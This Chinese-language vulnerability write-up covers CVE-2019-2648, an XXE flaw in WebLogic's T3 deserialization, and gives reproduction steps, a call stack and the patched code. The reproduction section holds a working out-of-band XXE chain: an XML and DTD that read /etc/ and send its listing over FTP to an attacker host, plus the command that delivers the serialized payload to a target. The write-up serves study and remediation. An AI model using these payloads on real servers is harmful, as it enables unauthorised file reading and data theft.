# Weblogic T3 XXE 反序列化漏洞-CVE-2019-2648

## 漏洞原理

该漏洞点在weblogic.wsee.reliability.WsrmServerPayloadContext#readEndpt方法解析**DocumentBuilderFactory**实例加载XML外部实体

## 漏洞复现

工具：VulnsDebug

在攻击机上创建一个目录，在该目录下创建空的my.dtd文件，然后开启http和ftp服务

mkdir xxe

cd xxe

touch my.dtd

python -m http.server 8000

python -m pyftpdlib 2121

 ![image-20221206185729162](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221206185729162.png) 

**生成序列化数据时会请求攻击机上的my.dtd文件，需要保证攻击机上的my.dtd文件为空文件**

创建test.xml文件（功能用于列出/etc/目录下文件）

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
        <!ENTITY % file SYSTEM "file:///etc/">
        <!ENTITY % dtd SYSTEM "http://192.168.8.133:8000/my.dtd">
        %dtd;
      %ftp;
        ]>
<ANY>xxe</ANY>
```

运行VulnsDebug的Payload.XXE.CVE_2019_2648#main生成序列化文件

![image-20221206190744669](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221206190744669.png) 

<img src="D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221206191938458.png" alt="image-20221206191938458" style="zoom:80%;" /> 

修改生成的序列化文件，在其中加入

%dtd;

![image-20221207000707215](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221207000707215.png) 

修改攻击机上的my.dtd文件后重启开启http服务

```
<!ENTITY % all
"<!ENTITY &#x25; ftp SYSTEM 'ftp://192.168.8.133:2121/%file;'>"
>
%all;
```

 ![image-20221207000321894](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221207000321894.png)

向服务器发送序列化数据

python weblogic_t3.py 192.168.8.139 7001 xxe/CVE-2019-2648.ser

![image-20221207001019736](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221207001019736.png)

攻击机http服务成功接收请求，ftp服务成功读取weblogic服务器/etc/目录下文件

![image-20221207001006664](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2019-2648/image-20221207001006664.png)

## 漏洞分析

调用栈

```java
parse:116, DocumentBuilder (javax.xml.parsers)
readEndpt:148, WsrmServerPayloadContext (weblogic.wsee.reliability)
readExternal:107, WsrmServerPayloadContext (weblogic.wsee.reliability)
readExternalData:1835, ObjectInputStream (java.io)
readOrdinaryObject:1794, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

## 漏洞修复

对DocumentBuilderFactory实例对象进行setFeature操作，禁止加载XML外部实体

修复后代码

```java
private EndpointReference readEndpt(ObjectInput var1, int var2) throws IOException, ClassNotFoundException {
        ...
ByteArrayInputStream var15 = new ByteArrayInputStream(var3);

    try {
        DocumentBuilderFactory var7 = DocumentBuilderFactory.newInstance();

        try {
            String var8 = "http://xml.org/sax/features/external-general-entities";
            var7.setFeature(var8, false);
            var8 = "http://xml.org/sax/features/external-parameter-entities";
            var7.setFeature(var8, false);
            var8 = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
            var7.setFeature(var8, false);
            var7.setXIncludeAware(false);
            var7.setExpandEntityReferences(false);
        } catch (Exception var11) {
            if (verbose) {
                Verbose.log("Failed to set factory:" + var11);
            }
        }
        ...
}
```



## 参考

